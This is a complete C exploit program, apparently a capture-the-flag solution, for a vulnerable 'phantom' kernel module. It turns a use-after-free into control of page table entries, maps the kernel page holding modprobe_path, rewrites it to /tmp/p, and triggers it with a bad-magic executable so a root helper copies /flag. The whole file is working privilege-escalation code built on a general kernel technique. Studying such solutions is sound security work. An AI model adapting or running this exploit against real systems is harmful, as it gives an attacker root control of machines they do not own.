/*
 * tiny_exploit.c: no-libc static exploit runner for the phantom.ko UAF/PT takeover.
 * Assumes the provided kernel has KASLR disabled and modprobe_path at a fixed phys page.
 */

#include <stdint.h>
#include <stddef.h>

#define SYS_read        0
#define SYS_write       1
#define SYS_open        2
#define SYS_close       3
#define SYS_mmap        9
#define SYS_mprotect   10
#define SYS_munmap     11
#define SYS_ioctl      16
#define SYS_fork       57
#define SYS_execve     59
#define SYS_wait4      61
#define SYS_exit       60
#define SYS_chmod      90
#define SYS_openat    257

#define AT_FDCWD       -100

#define O_RDONLY        0
#define O_WRONLY        1
#define O_RDWR          2
#define O_CREAT       0100
#define O_TRUNC      01000

#define PROT_READ       1
#define PROT_WRITE      2
#define MAP_SHARED      1
#define MAP_PRIVATE     2
#define MAP_FIXED      16
#define MAP_ANONYMOUS  32

#include "interface.h"

#define PAGE_SZ 0x1000UL
#define WIN_SZ  0x200000UL

/* Derived from bzImage->vmlinux used by the challenge. */
#define MODPROBE_PATH_PFN 0x2b3fULL
#define MODPROBE_PATH_OFF 0x5c0ULL

static inline long sys_call6(long n, long a1, long a2, long a3, long a4, long a5, long a6) {
  long ret;
  register long r10 __asm__("r10") = a4;
  register long r8  __asm__("r8")  = a5;
  register long r9  __asm__("r9")  = a6;
  __asm__ volatile (
    "syscall"
    : "=a"(ret)
    : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(r10), "r"(r8), "r"(r9)
    : "rcx", "r11", "memory"
  );
  return ret;
}

static inline long sys_call3(long n, long a1, long a2, long a3) {
  return sys_call6(n, a1, a2, a3, 0, 0, 0);
}
static inline long sys_call4(long n, long a1, long a2, long a3, long a4) {
  return sys_call6(n, a1, a2, a3, a4, 0, 0);
}
static inline long sys_call2(long n, long a1, long a2) {
  return sys_call6(n, a1, a2, 0, 0, 0, 0);
}
static inline long sys_call1(long n, long a1) {
  return sys_call6(n, a1, 0, 0, 0, 0, 0);
}
static inline long sys_call0(long n) {
  return sys_call6(n, 0, 0, 0, 0, 0, 0);
}

static size_t c_strlen(const char *s) {
  size_t n = 0;
  while (s[n]) n++;
  return n;
}

static int c_memcmp(const void *a, const void *b, size_t n) {
  const unsigned char *x = (const unsigned char *)a;
  const unsigned char *y = (const unsigned char *)b;
  for (size_t i = 0; i < n; i++) {
    if (x[i] != y[i]) return (int)x[i] - (int)y[i];
  }
  return 0;
}

static void c_memset(void *dst, int v, size_t n) {
  unsigned char *d = (unsigned char *)dst;
  for (size_t i = 0; i < n; i++) d[i] = (unsigned char)v;
}

static void c_memcpy(void *dst, const void *src, size_t n) {
  unsigned char *d = (unsigned char *)dst;
  const unsigned char *s = (const unsigned char *)src;
  for (size_t i = 0; i < n; i++) d[i] = s[i];
}

static void die(const char *msg) {
  (void)sys_call3(SYS_write, 2, (long)msg, (long)c_strlen(msg));
  (void)sys_call1(SYS_exit, 1);
}

static long x_open(const char *path, long flags, long mode) {
  return sys_call6(SYS_openat, AT_FDCWD, (long)path, flags, mode, 0, 0);
}

static long x_write(long fd, const void *buf, size_t n) {
  return sys_call3(SYS_write, fd, (long)buf, (long)n);
}

static void *x_mmap(void *addr, size_t len, long prot, long flags, long fd, long off) {
  return (void *)sys_call6(SYS_mmap, (long)addr, (long)len, prot, flags, fd, off);
}

static long x_ioctl(long fd, long req, long arg) {
  return sys_call3(SYS_ioctl, fd, req, arg);
}

static uint64_t make_pte(uint64_t pfn) {
  /* present|rw|user|accessed|dirty + software bits + NX */
  uint64_t pte = (pfn << 12) | (0x67ULL | 0xe00ULL);
  pte |= (1ULL << 63);
  return pte;
}

static void *map_win_aligned_2m(void) {
  void *tmp = x_mmap(0, WIN_SZ * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if ((long)tmp < 0) return (void *)0;

  uintptr_t base = (uintptr_t)tmp;
  uintptr_t aligned = (base + WIN_SZ - 1) & ~(WIN_SZ - 1);

  (void)sys_call2(SYS_munmap, (long)tmp, (long)(WIN_SZ * 2));

  void *win = x_mmap((void *)aligned, WIN_SZ, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  if ((long)win < 0) return (void *)0;
  if (((uintptr_t)win & (WIN_SZ - 1)) != 0) return (void *)0;
  return win;
}

static void write_file(const char *path, const void *buf, size_t n) {
  long fd = x_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
  if (fd < 0) die("open write failed\n");
  if (x_write(fd, buf, n) != (long)n) die("write failed\n");
  (void)sys_call1(SYS_close, fd);
}

static void chmod777(const char *path) {
  if (sys_call2(SYS_chmod, (long)path, 0777) < 0) die("chmod failed\n");
}

static void trigger_modprobe(void) {
  static const char helper[] =
      "#!/bin/sh\n"
      "cat /flag > /tmp/flag\n"
      "chmod 777 /tmp/flag\n";
  static const unsigned char bad[4] = {0xff, 0xff, 0xff, 0xff};

  write_file("/tmp/p", helper, sizeof(helper) - 1);
  chmod777("/tmp/p");

  write_file("/tmp/x", bad, sizeof(bad));
  chmod777("/tmp/x");

  long pid = sys_call0(SYS_fork);
  if (pid == 0) {
    char *const argv[] = {(char *)"/tmp/x", 0};
    char *const envp[] = {0};
    (void)sys_call3(SYS_execve, (long)"/tmp/x", (long)argv, (long)envp);
    (void)sys_call1(SYS_exit, 0);
  }
  (void)sys_call4(SYS_wait4, pid, 0, 0, 0);
}

static void print_tmp_flag(void) {
  long fd = x_open("/tmp/flag", O_RDONLY, 0);
  if (fd < 0) die("/tmp/flag missing\n");
  char buf[128];
  long n = sys_call3(SYS_read, fd, (long)buf, (long)sizeof(buf));
  if (n > 0) (void)x_write(1, buf, (size_t)n);
  (void)sys_call1(SYS_close, fd);
}

int main(void) {
  for (int attempt = 0; attempt < 4000; attempt++) {
    void *win = map_win_aligned_2m();
    if (!win) continue;

    long fd = x_open("/dev/phantom", O_RDWR, 0);
    if (fd < 0) die("open /dev/phantom failed\n");
    if (x_ioctl(fd, CMD_ALLOC, 0) != 0) die("ioctl alloc failed\n");

    uint64_t *uaf = (uint64_t *)x_mmap(0, PAGE_SZ, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if ((long)uaf < 0) die("mmap uaf failed\n");

    if (x_ioctl(fd, CMD_FREE, 0) != 0) die("ioctl free failed\n");
    (void)sys_call1(SYS_close, fd);

    /* Populate PTEs for this window. */
    ((volatile unsigned char *)win)[0] = 1;

    /* Map modprobe_path page at an untouched slot. */
    const size_t slot = 3;
    uaf[slot] = make_pte(MODPROBE_PATH_PFN);

    const char expect[] = "/sbin/modprobe";
    char *mp = (char *)win + slot * PAGE_SZ + MODPROBE_PATH_OFF;
    if (c_memcmp(mp, expect, sizeof(expect) - 1) != 0) {
      /* Not controlling PTEs this attempt, or wrong location. */
      uaf[slot] = 0;
      (void)sys_call2(SYS_munmap, (long)uaf, PAGE_SZ);
      (void)sys_call2(SYS_munmap, (long)win, WIN_SZ);
      continue;
    }

    /* Patch modprobe_path. */
    c_memset(mp, 0, 32);
    c_memcpy(mp, "/tmp/p", 7);

    /* Clear mapping to avoid leaving weird PTEs behind. */
    uaf[slot] = 0;

    trigger_modprobe();
    print_tmp_flag();
    (void)sys_call1(SYS_exit, 0);
  }

  die("exploit failed\n");
  return 0;
}

__attribute__((naked)) void _start(void) {
  __asm__ volatile(
    "xor %rbp, %rbp\n"
    "andq $-16, %rsp\n"
    "call main\n"
    "mov %rax, %rdi\n"
    "mov $60, %rax\n"
    "syscall\n"
  );
}